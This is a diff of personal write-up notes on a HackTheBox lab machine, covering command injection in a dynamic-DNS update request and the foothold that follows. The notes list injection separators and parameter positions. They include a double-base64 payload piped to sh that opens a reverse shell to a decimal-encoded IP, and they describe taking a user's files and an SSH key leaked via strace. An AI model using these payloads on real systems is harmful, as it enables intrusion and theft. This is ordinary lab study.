@@ -119,7 +119,6 @@ CMDi is suggest by XCT - I paused the video I tried for CMDi
 ![](miliseconuponnewline.png)
 I could not replicate the the same temporal delay on the `\n` to inject.
 
-
 Not being methodical enough - STOP: 
 - Create List
 - Question How it works
@@ -194,9 +193,124 @@ if so concatenate - https://gabb4r.gitbook.io/oscp-notes/cheatsheet/command-inje
 
 Reread [Portswigger](https://portswigger.net/web-security/os-command-injection) article and read [Portswigger issues 00100100](https://portswigger.net/kb/issues/00100100_os-command-injection), [Github - Hacktricks](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/command-injection.md), [Busra Demir's cobalt.io CMDi Article](https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Finally I review the https://github.com/payloadbox - For each? The answer NO. Big NO. The list contains lots of very dangerous commands, which you could empirically verify if they worked and would cause actual harm to systems that did end up executing them. Interesting is the ways that are not documented from the other sources to actually work. There is also shellshock in the Windows List..
 
-https://www.youtube.com/watch?v=ppYNkvlR9jM
+#### Returned to CMDi more properly
+
+```
+; I ;
+;
+& I &
+&
+&& 
+| I |
+|| I ||
+&& I &&
+${LS_COLORS:10:1}${IFS}
+$()
+` I `
+\n 
+```
+- LoA
+	- `hostname=nvm`INJECTIONHERE`.no-ip.htb&myip=10.10.14.70
+	- `hostname=`INJECTIONHERE`nvm.no-ip.htb&myip=10.10.14.70
+	- `hostname=nvm.no-ip.htb`INJECTIONHERE`&myip=10.10.14.70
+	- `hostname=nvm.no-ip.htb&myip=`INJECTIONHERE`10.10.14.70
+	- `hostname=nvm.no-ip.htb&myip=10.10.14.70`INJECTIONHERE
+![](changeduptheipandhostnameasdas.png)
+
+Less blind just no more CMDi
+![](atleastitshowsniburp.png)
+
+No doing bash `{}` substitution.
+![](nodoingsubstitution.png)
+
+I put in the work, I must me missing something
+[xct](https://www.youtube.com/watch?v=ppYNkvlR9jM) says it should not matter which field. I paused on "dots to serparate IP" as I had this error. 
+![](dottoseperateip.png)
+
+Decimal IP values is a very old trick from the nineties - 1998 and 2001 - [Defcon 31 talk](https://youtu.be/RRjre0dnOGQ?si=HkLzMIQKlk72m2vc&t=545) from the Microsoft TCP stack. 
+![](dotlessip.png)
+[Used ipaddressguide.com](https://www.ipaddressguide.com/ip)
+
+Python coding with [phind](https://www.phind.com/)
+```python
+import ipaddress
+
+# Define the IP address
+ipv4_address = '192.168.0.1'
+ipv6_address = '2001:db8::1'
+
+# Create an IP address object
+ipv4_obj = ipaddress.ip_address(ipv4_address)
+ipv6_obj = ipaddress.ip_address(ipv6_address)
+
+# Convert the IP address object to an integer
+dotless_ipv4 = int(ipv4_obj)
+dotless_ipv6 = int(ipv6_obj)
+
+# Print the dotless decimal value
+print(dotless_ipv4)
+print(dotless_ipv6)
+```
+
+Double base64 decode
+```bash
+$(echo+YzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TVRZNE5ETXhNVGMwTHpVeklEQStKakVL+|base64+-d|base64+-d|sh)
+# |bash as well, but failed
+```
+
+Lesson 
+- read the errors what is it doing 
+- remember nightmare dots, slashes, quotes, etc - need a good meumonic
+![](hurray.png)
 ## Foothold
 
+![](bindmgrandynausers.png)
+
+![](127-0-1-1.png)
+
+![](passwd.png)
+
+![](homedirectories.png)
+
+support case
+
+![](nosshkey.png)
+
+![](unamea.png)
+
+![](sstulpn.png)
+
+![](butroutetable.png)
+nothing in resolv.conf
+
+
+Exfiled the `/home/bindmgr/support-case-C62796521` directory
+![](exfilthecasework.png)
+
+![](commout.png)
+
+The `strace` leakes the SSH private key, which also very handlerly is perfectly formatted for echo
+![](sshidainthestrace.png)
+
+Exfil the script broke so I went back to get that as I still need the password
+![](exfiltheweirdfile.png)
+
+Password attempts will terminal buffer slows for the massive base64
+```
+sndanyd
+dynadns
+```
+
+Re exfiltrated the .script and tried to find the bindmgr-release.zip, but no return
+![](exfilandzipfilenofindo.png)
+
+Cannot seem to find the `[]char`
+![](samecharbuffers.png)
+
+nomem.local 
+192.168.178.27 tsftp.infra.dyna.htb
+
+![](noresolutiononinfra.png)
 ## Privilege Escalation
 
 ## Beyond Root
